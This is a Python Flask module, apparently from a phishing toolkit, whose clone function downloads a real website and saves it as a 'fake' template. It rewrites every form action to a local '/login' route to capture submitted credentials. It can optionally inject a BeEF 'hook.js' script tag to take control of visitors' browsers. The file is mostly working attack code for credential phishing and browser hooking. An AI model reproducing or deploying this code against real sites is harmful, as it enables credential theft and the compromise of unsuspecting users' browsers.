import requests
import re
import os
from urllib.parse import urlsplit

from flask import current_app


def convert_local_urls(r_response):
    """Substitui urls locals para url remota para criar uma copia rasa recursiva de scripts e arquivos
    param: requests.models.Response (object response requests)

    Exemplo:
        href="/static/file.css"

        substitui por:
        href="http://domain.com/static/file.css"  
    """
    url = urlsplit(r_response.url)
    url = "{uri.scheme}://{uri.hostname}".format(uri=url)
    content = r_response.text
    content = content.replace('href="/', 'href="{}/'.format(url))
    content = content.replace('src="/', 'src="{}/'.format(url))
    return content

# CLONING FUNCTIONS --------------------------------------------------------------------------------------------
def clone(url, user_agent, beef):
    try:        
        u = url.replace('://', '-')
        templates_path = os.path.join(current_app.root_path, current_app.template_folder)
        q = "{}/fake/{}/{}".format(templates_path, user_agent, u)
        os.makedirs(q, exist_ok=True)
        temp_ind_path = "{}/fake/{}/{}/index.html".format(templates_path, user_agent, u)
        headers = {'User-Agent': user_agent}
        r = requests.get(url, headers=headers)
        html = convert_local_urls(r)        
        old_regular = re.findall(r'action="([^ >"]*)"',html)
        new_regular = '/login'
        for r in old_regular:
            html = html.replace(r, new_regular)
        if beef == 'yes':
            inject = '<script src=":3000/hook.js" type="text/javascript"></script></body>'
            html = html.replace("</body>", inject)
        new_html = open(temp_ind_path, 'w')
        new_html.write(html.encode('ascii', 'ignore').decode('ascii'))
        new_html.close()
    except Exception as error:
        pass
#--------------------------------------------------------------------------------------------------------------------